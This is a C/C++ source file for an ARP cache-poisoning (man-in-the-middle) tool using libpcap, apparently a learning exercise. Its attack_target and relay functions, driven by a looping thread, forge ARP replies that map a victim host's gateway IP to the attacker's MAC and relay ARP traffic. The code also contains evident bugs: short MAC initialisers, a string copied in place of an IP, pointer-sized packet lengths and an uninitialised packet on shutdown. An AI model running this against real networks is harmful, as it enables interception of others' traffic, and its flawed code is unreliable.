#include <pcap.h>
#include<stdint.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <pthread.h>
void reply_arp(const u_char *packet);
u_char *recvpacket(const u_char *packet);
char *relay(pcap_t *handle,const u_char *packet);
int attack_target(pcap_t *handle);

struct ethernet_hdr
{
    uint8_t  ether_dhost[6];/* destination ethernet address */
    uint8_t  ether_shost[6];/* source ethernet address */
    uint16_t ether_type;                 /* protocol */
};

struct arp_hdr
{
    uint16_t ar_hrd;         /* format of hardware address */
    uint16_t ar_pro;         /* format of protocol address */
    uint8_t  ar_hln;         /* length of hardware address */
    uint8_t  ar_pln;         /* length of protocol addres */
    uint16_t ar_op;          /* operation type */
    u_char  ar_sendermac[6];
    u_char  ar_sendip[4];
    u_char  ar_targetmac[6];
    u_char  ar_targetip[4];

};

struct sum //packging packet
{
    ethernet_hdr a;
    arp_hdr b;
};
int send(ethernet_hdr &send_ethernet, arp_hdr &send_arp);
int arp_setting(ethernet_hdr &a, arp_hdr &b,int flag);

//my ethernet importmation
uint8_t myethernet[6] = {0x0c,0x29,0xd6,0x34,0x32}; //ethernetmac address
uint8_t broadcastmac[6] = {0xff,0xff,0xff,0xff,0xff};
char my_ip[] = "10.100.111.207";
u_char *gatewaymac, *hostmac;
in_addr myip, recvip , targetip; // recvip = gateway, targetip = victeam

//thread
pthread_t tid;
void *thread(void *);

int stop =1;
pcap_t *handle;
int main(int args,char *argv[])

{
    struct pcap_pkthdr pcap_header; //pcap next
    /* Session handle */
    const u_char *packet;
    char *dev;            /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];    /* Error string */
    dev  =  "eth0";
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    //recv mac address getting!!
    inet_aton(my_ip,&myip);
    inet_aton(argv[2],&recvip);
    ethernet_hdr recv_ethernet,target_ethernet;
    arp_hdr recv_arp,target_arp;
    //target mac address get
    inet_aton(argv[1],&targetip);
    printf("target_host ip : %s\n",inet_ntoa(targetip));
    if(arp_setting(target_ethernet,target_arp,2) == 0)
    {
        if(send(target_ethernet,target_arp) == 0)
        {
            packet = pcap_next(handle,&pcap_header);
            hostmac = recvpacket(packet);
        }
    }

    if(arp_setting(recv_ethernet,recv_arp,1) == 0)
    {
        if(send(recv_ethernet,recv_arp) == 0)
        {
            for(int i =0 ; i <= 10; i++)
            {
                packet = pcap_next(handle,&pcap_header);
                gatewaymac = recvpacket(packet);
            }
        }

    }
    //  Attack ARP target !!
    pthread_create(&tid,NULL,&thread,NULL);
    printf("stop attacking????\n");
    printf("1. stop\n");
    scanf("%d",&stop);
    if(stop == 1)
    {   sum *s3;
        ethernet_hdr main3_ethernet;
        arp_hdr main3_arp;
        s3 = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
        s3->a = main3_ethernet; //ethernet
        s3->b = main3_arp; //arp
        const u_char *c3 = (u_char *)s3;
        if(arp_setting(main3_ethernet,main3_arp,3) ==0)
            pcap_sendpacket(handle,c3,sizeof(*s3));
    }










    /* And close the session */

    pcap_close(handle);

    return(0);


}
int arp_setting(ethernet_hdr &e, arp_hdr &a,int flag)
{

    //ethernet_broadcast impormation
    memset(e.ether_dhost,0xff,6);
    e.ether_type = htons(ETHERTYPE_ARP); //claer
    a.ar_hln = 6;//hawdware szie
    a.ar_pln = 4;//protocol size
    a.ar_hrd = htons(ARPHRD_ETHER);
    a.ar_pro = htons(ETHERTYPE_IP);
    a.ar_op = htons(ARPOP_REQUEST);
    //ARP MAC
    memset(a.ar_targetmac,0,sizeof(a.ar_targetmac));
    //ARP IP
    switch(flag)
    {
    case 1:
        memcpy(e.ether_shost,&myethernet,6);
        memcpy(a.ar_sendip, &myip, 4);
        memcpy(a.ar_sendermac,&myethernet,6);
        memcpy(a.ar_targetip, &recvip,4);
        return 0;
        break;
    case 2:
        memcpy(e.ether_shost,&myethernet,6);
        memcpy(a.ar_sendip, &my_ip, 4);
        memcpy(a.ar_sendermac,&myethernet,6);
        memcpy(a.ar_targetip, &targetip,4);
        return 0;
        break;
   default :
        return 0;
        break;

    }

    return 1;
}

//sucess
u_char *recvpacket(const u_char *packet)
{
    ethernet_hdr *ethernet = (ethernet_hdr *) packet;
    if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP)
    {
        arp_hdr *arp_packet = (arp_hdr *)(packet + sizeof(ethernet_hdr));
        if((ntohs(arp_packet->ar_pro) == ETHERTYPE_IP)&&(ntohs(arp_packet->ar_op) == ARPOP_REPLY))
        {

            if(memcmp(arp_packet->ar_sendip,&recvip,4)==0)
            {
                printf("gateway mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
                return(arp_packet->ar_sendermac);
            }


            else if(memcmp(arp_packet->ar_sendip,&targetip,4)==0)

            {
                printf("target mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
                return(arp_packet->ar_sendermac);
            }


        }

    }
}


//problem
int attack_target(pcap_t *handle)
{
    //u_char targetmac[6] = {0xac,0xd1,0xb8,0xde,0x4a,0x27};
    sum *s3;
    ethernet_hdr attack_ether;
    arp_hdr attack_arp;
    memcpy(attack_ether.ether_shost,&myethernet,6);
    memcpy(attack_ether.ether_dhost,&hostmac,6);
    //memcpy(attack_ether.ether_dhost,&targetmac,6);
    attack_ether.ether_type = htons(ETHERTYPE_ARP); //claer
    attack_arp.ar_hln = 6;//hawdware szie
    attack_arp.ar_pln = 4;//protocol size
    attack_arp.ar_hrd = htons(ARPHRD_ETHER);
    attack_arp.ar_pro = htons(ETHERTYPE_IP);
    attack_arp.ar_op = htons(ARPOP_REPLY);
    memcpy(attack_arp.ar_sendermac,&myethernet,6);
    memcpy(attack_arp.ar_sendip,&recvip,4);
    memcpy(attack_arp.ar_targetip,&targetip,4);
    memcpy(attack_arp.ar_targetmac,&hostmac,6);
    send(attack_ether,attack_arp);
    return 0;


}
char *relay(pcap_t *handle,const u_char *packet)
{
    //printf("relay section!!!!\n");
    //printf("=======================\n");
    ethernet_hdr *ethernet = (ethernet_hdr *) packet;
    arp_hdr *arp_packet = (arp_hdr *)(packet + sizeof(ethernet_hdr));
    //printf("source mac : %s\n",ether_ntoa((ether_addr*)(ethernet->ether_shost)));
    //printf("destination mac : %s\n",ether_ntoa((ether_addr*)(ethernet->ether_dhost)));
    //printf("source ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_sendip)));
    //printf("source mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_sendermac)));
    //printf("destination ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_targetip)));
    //printf("destination mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_targetmac)));
    if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP)
    {


        if(memcmp(arp_packet->ar_sendip,&targetip,4)==0)
        {

            if(ntohs(arp_packet->ar_op) == ARPOP_REQUEST)
            {
                //printf("relay(request!!!!!!!\n)");
                memcpy(ethernet->ether_dhost,&gatewaymac,6);
                memcpy(arp_packet->ar_sendermac,&myethernet,6);
                memcpy(arp_packet->ar_targetmac,&gatewaymac,6);
                //printf("source ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_sendip)));
                //printf("source mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_sendermac)));
                //printf("destination ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_targetip)));
                //printf("destination mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_targetmac)));
                pcap_sendpacket(handle,packet,sizeof(ethernet)+sizeof(arp_packet));
                //packetsend();
            }
        }
        //recv -> target relay
        else if(memcmp(arp_packet->ar_sendip,&recvip,4)==0)
        {
            if(ntohs(arp_packet->ar_op) == ARPOP_REPLY)
            {
                printf("relay(reply !!!!!!!!!!!!)\n");
                memcpy(ethernet->ether_dhost,&hostmac,6);
                memcpy(arp_packet->ar_sendermac,&myethernet,6);
                memcpy(arp_packet->ar_targetmac,&hostmac,6);
                //printf("source ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_sendip)));
                //printf("source mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_sendermac)));
                //printf("destination ip :%s\n",inet_ntoa((in_addr &)(arp_packet->ar_targetip)));
                //printf("destination mac : %s\n",ether_ntoa((ether_addr*)(arp_packet->ar_targetmac)));
                pcap_sendpacket(handle,packet,sizeof(ethernet) + sizeof(arp_packet));

            }
        }

    }
}

void *thread(void *)
{
    struct pcap_pkthdr pcap_header;
    const u_char *packet;
    while(stop)
    {
        if(attack_target(handle)==0)
            packet = pcap_next(handle,&pcap_header);
        relay(handle,packet);
        sleep(2);
    }
}

int send(ethernet_hdr &send_ethernet, arp_hdr &send_arp)
{
    sum *s;
    s =(sum *)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
    s->a = send_ethernet;
    s->b = send_arp;
    const u_char *c = (u_char *)s;
    if(pcap_sendpacket(handle,c,sizeof(*s))==0)
        return 0;
}
